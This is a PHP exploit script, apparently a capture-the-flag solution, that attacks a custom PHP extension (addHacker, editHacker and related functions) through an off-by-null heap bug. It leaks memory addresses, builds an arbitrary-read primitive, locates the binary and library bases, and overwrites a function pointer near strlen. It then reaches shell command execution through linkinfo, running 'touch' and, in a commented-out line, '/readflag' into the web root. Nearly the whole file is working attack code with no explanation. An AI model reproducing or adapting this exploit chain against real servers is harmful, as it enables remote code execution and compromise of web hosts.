<?php

function Substring($string, $start, $length = null) {
    $result = "";
    for ($i = $start; ($length === null || $i - $start < $length); $i++) {
        $result .= $string[$i];
    }
    return $result;
}
function u64($byteArray) {
    $integerValue = 0;
    for ($i = 7; $i >= 0; $i--) {
        $byteValue = ord($byteArray[$i]);
        $shift = ((7 - (7-$i) ) * 8);
        $integerValue += ($byteValue << $shift);
    }
    return $integerValue;
}

/* 思路 off by null */

$payload = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"; /*0x20*/
addHacker("aaaaaaaaaaaaaaaa", $payload);
$res = displayHacker(0);
$leak = u64( Substring($res, 0x10, 6) );
/* echo ($leak); */
/* echo "\n"; */

removeHacker(0);

addHacker($payload, $payload);
addHacker($payload, $payload);
addHacker($payload, $payload);
addHacker($payload, $payload);
removeHacker(0);

addHacker("\x00\x01\x02\x03\x04\x05\x06\x07\x30\x00\x00\x00\x00\x00\x00\x00\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3A\x3B\x3C\x3D\x3E\x3F", "0\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x000\x00");


$res = displayHacker(0);
echo ($res);

function arbRead($addr) {
    editHacker(0, pack("P", $addr));
    $res = displayHacker(2);
    $leak = u64( $res );
    echo ($res);
    echo "\n";
    echo ($leak);
    echo "\n";
    return $leak;
}

for ($i=0; $i < 0x400; $i++) { 
   $elf_base = arbRead((8 * $i) + ($leak & 0x7ffffffff000));
   if ($elf_base >= 0x500000000000 && $elf_base <= 0x600000000000) {
       echo "FOUND!";
       echo $elf_base;
       echo "FOUND!";
       echo $i;
       break;
   }
}

for ($i=0x100; $i < 0x130; $i++) { 
   $tmp = arbRead((8 * $i) + ($elf_base));
   if ($tmp == 0x736568) {
       $off = (8 * ($i - 18));
       break;
   }
}

$tmp = arbRead($off + $elf_base) - 0xE8BC3D;
echo $tmp;
/* arbRead($tmp+ 0x101cf68); */
$elf_base = arbRead($tmp + 0x101ff70) - 0x77980;
echo $elf_base;

/* editHacker(0, pack("P", $tmp + 0x101e760)); */
/* editHacker(0, pack("P", $tmp + 0x101fd40)); */
/* strlen */
editHacker(0, pack("P", $tmp + 0x101cf68));
/* strdup */
/* editHacker(0, pack("P", $tmp + 0x10200a0)); */
/* editHacker(0, pack("P", $tmp + 0x101d228)); */
/* editHacker(0, pack("P", $tmp + 0x101ee40)); */
/* editHacker(0, pack("P", $tmp + 0x101e760)); */

editHacker(2, pack("P", $elf_base + 0x4c490));
/* editHacker(2, pack("P", $elf_base + 0x77980)); */
/* editHacker(2, pack("P", 0xdeadbeef)); */

/* linkinfo("/readflag>/var/www/html/a.txt"); */
linkinfo("touch /var/www/html/a.txt");

/* addHacker("/readflag>/var/www/html/a.txt\x00", "/readflag>/var/www/html/a.txt\x00"); */
/* echo displayHacker(4); */
/* editHacker(4, "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"); */
/* removeHacker(4); */

?>
